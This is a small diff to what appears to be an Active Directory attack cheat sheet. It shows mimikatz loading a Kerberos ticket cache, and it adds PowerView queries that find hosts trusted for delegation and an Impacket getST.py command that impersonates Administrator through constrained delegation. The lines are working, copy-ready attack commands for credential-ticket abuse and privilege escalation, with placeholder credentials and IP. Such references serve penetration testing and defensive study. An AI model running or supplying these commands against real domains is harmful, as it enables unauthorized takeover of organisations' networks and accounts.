@@ -76,5 +76,8 @@ Then use `mimikatz` to load the ticket.
 
 mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
 Get-DomainComputer -TrustedToAuth | select -exp dnshostname #Identify
+Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo # Figure out exposed servie
+getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
+ 
 ```
 
